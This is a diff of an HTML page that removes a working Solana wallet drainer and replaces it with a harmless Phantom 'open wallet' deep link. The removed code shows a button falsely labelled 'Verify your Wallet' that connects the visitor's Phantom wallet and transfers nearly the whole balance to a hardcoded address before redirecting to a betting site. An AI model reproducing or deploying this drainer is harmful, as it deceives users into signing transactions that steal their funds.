@@ -28,7 +28,7 @@
       margin-bottom: 20px;
     }
 
-    #sendButton {
+    #open {
       background-color: #14f195;
       border: none;
       color: black;
@@ -40,54 +40,21 @@
       transition: all 0.3s ease;
     }
 
-    #sendButton:hover {
+    #open:hover {
       background-color: #13d986;
       transform: scale(1.05);
     }
   </style>
 </head>
 <body>
-  <button id="sendButton">Verify your Wallet</button>
+  <button id="open">Open Phantom Wallet</button>
 
   <script>
-    const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
-
-    const destination = "AunHeraAbHaG8JmfgQAGJtKPvTKXH1bvrcw3shxfVzHY";
-
-    document.getElementById('sendButton').onclick = async () => {
-      try {
-        const provider = window.phantom?.solana;
-        if (!provider?.isPhantom) return alert("Phantom wallet not found. Use a mobile browser with Phantom installed.");
-
-        const { publicKey } = await provider.connect(); // 🔑 گرفتن آدرس
-        const fromPubkey = publicKey;
-        const toPubkey = new solanaWeb3.PublicKey(destination);
-
-        const balance = await connection.getBalance(fromPubkey);
-        if (balance < 5000) return alert("Insufficient balance.");
-
-        const tx = new solanaWeb3.Transaction().add(
-          solanaWeb3.SystemProgram.transfer({
-            fromPubkey,
-            toPubkey,
-            lamports: balance - 5000
-          })
-        );
-
-        tx.feePayer = fromPubkey;
-        const { blockhash } = await connection.getLatestBlockhash();
-        tx.recentBlockhash = blockhash;
-
-        const signedTx = await provider.signTransaction(tx);
-        const signature = await connection.sendRawTransaction(signedTx.serialize());
-        await connection.confirmTransaction(signature);
-
-        window.location.href = "https://dexsport.io/";
-      } catch (e) {
-        console.error(e);
-        alert("Transaction error: " + e.message);
-      }
+    document.getElementById('open').onclick = () => {
+      const targetLink = encodeURIComponent("https://google.com/");
+      window.location.href = `https://phantom.app/ul/v1/browse?redirect_link=${targetLink}`;
     };
   </script>
 </body>
+
 </html>
